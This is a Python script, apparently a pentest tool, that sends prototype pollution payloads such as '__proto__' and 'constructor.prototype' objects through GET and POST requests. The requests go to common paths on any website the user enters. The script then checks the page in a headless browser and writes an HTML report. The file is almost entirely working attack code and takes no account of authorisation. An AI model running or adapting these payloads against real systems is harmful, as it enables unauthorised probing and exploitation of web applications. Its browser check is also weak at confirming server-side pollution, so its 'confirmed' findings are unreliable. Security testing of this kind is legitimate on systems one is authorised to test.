import requests
from urllib.parse import urljoin, urlencode
from playwright.sync_api import sync_playwright
from jinja2 import Template
import uuid
import os

PAYLOADS = [
    {"__proto__": {"polluted": "true"}},
    {"constructor": {"prototype": {"polluted": "true"}}},
    {"__proto__.polluted": "true"},
    {"prototype.polluted": "true"}
]

FUZZ_PATHS = ["/api/", "/config", "/data", "/debug", "/v1", "/search", "/query"]
FUZZ_METHODS = ["GET", "POST"]
HEADERS = {"Content-Type": "application/json"}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Prototype Pollution Report</title>
<style>
body { font-family: Arial; background: #111; color: #eee; padding: 20px; }
h1 { color: #ff4081; }
code { background: #222; padding: 4px; border-radius: 5px; }
pre { background: #1e1e1e; padding: 10px; border-radius: 8px; overflow-x: auto; }
.success { color: #80ff80; }
.vuln { color: #ff5555; font-weight: bold; }
</style>
</head>
<body>
<h1>🧬 Prototype Pollution Report</h1>
<p><strong>Target:</strong> {{ target }}</p>
{% if findings %}
<h2 class="vuln">✅ Vulnerability Confirmed!</h2>
<ul>
{% for f in findings %}
<li><code>{{ f }}</code></li>
{% endfor %}
</ul>
{% else %}
<h2>❌ No confirmed prototype pollution found.</h2>
{% endif %}
</body>
</html>
"""

def scan_url(target):
    findings = []

    for path in FUZZ_PATHS:
        full_url = urljoin(target, path)

        for payload in PAYLOADS:
            for method in FUZZ_METHODS:
                try:
                    if method == "GET":
                        url = full_url + "?" + urlencode(payload)
                        r = requests.get(url, timeout=5)
                    else:
                        r = requests.post(full_url, json=payload, headers=HEADERS, timeout=5)

                    print(f"[+] Fuzzed {method} {r.url} -> {r.status_code}")

                except Exception as e:
                    print(f"[!] Error on {method} {full_url}: {e}")

    print("[*] Fuzzing done. Now checking browser prototype pollution...")
    findings = browser_check_pollution(target)
    return findings

def browser_check_pollution(url):
    findings = []
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto(url, timeout=10000)

        result = page.evaluate("""
            () => {
                let pollutedKeys = [];
                for (let k in {}) {
                    if (['polluted'].includes(k)) {
                        pollutedKeys.push(k);
                    }
                }
                return pollutedKeys;
            }
        """)
        if result:
            findings.extend(result)
        browser.close()
    return findings

def write_html_report(target, findings):
    filename = f"proto_pollution_report_{uuid.uuid4().hex[:6]}.html"
    with open(filename, "w") as f:
        html = Template(HTML_TEMPLATE).render(target=target, findings=findings)
        f.write(html)
    print(f"[+] Report saved as {filename}")
    os.startfile(filename) if os.name == 'nt' else os.system(f"open {filename}")

if __name__ == "__main__":
    print("== Prototype Pollution Validator ==")
    target = input("Enter target website (e.g., https://example.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target

    results = scan_url(target)
    write_html_report(target, results)
